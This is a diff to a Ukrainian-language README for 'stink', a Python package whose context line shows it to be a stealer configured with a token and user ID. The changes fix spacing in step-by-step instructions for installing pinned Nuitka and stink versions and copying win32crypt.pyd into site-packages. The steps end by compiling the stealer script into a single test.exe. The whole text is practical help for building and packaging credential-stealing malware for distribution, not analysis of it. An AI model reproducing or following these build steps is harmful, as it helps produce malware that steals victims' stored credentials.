@@ -125,15 +125,15 @@ Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
 ### PyCharm
 1. Встановлюємо Nuitka та Stink:
 ```
-pip install Nuitka == 0.6.16.4
+pip install Nuitka==0.6.16.4
 ```
 
 ```
-pip install stink == 0.0.3
+pip install stink==0.0.3
 ```
 2. Відкриваємо термінал і прописуємо команду:
 ```Python
-nuitka --onefile --include-package = stink test.py
+nuitka --onefile --include-package=stink test.py
 ```
 
 ### CMD
@@ -145,7 +145,7 @@ pip install virtualenv
 ```
 3. Переходимо в папку з файлом `test.py`:
 ```
-cd path \ to \ file
+cd path\to\file
 ```
 4. Створюємо віртуальне оточення і активуємо його:
 ```
@@ -153,21 +153,21 @@ virtualenv venv
 ```
 
 ```
-venv \ Scripts \ activate
+venv\Scripts\activate
 ```
 5. Встановлюємо Nuitka і Stink:
 ```
-pip install Nuitka == 0.6.16.4
+pip install Nuitka==0.6.16.4
 ```
 
 ```
-pip install stink == 0.0.3
+pip install stink==0.0.3
 ```
 6. У створеній папці venv переходимо по шляху `\Lib\site-packages\win32\`, копіюємо файл `win32crypt.pyd` і вставляємо по шляху`\Lib\site-packages\`.
 
 7. Повертаємося до `cmd` і прописуємо команду:
 ```
-nuitka --onefile --include-package = stink stink_test.py
+nuitka --onefile --include-package=stink test.py
 ```
 
 Після виконання команди отримуємо test.exe файл.
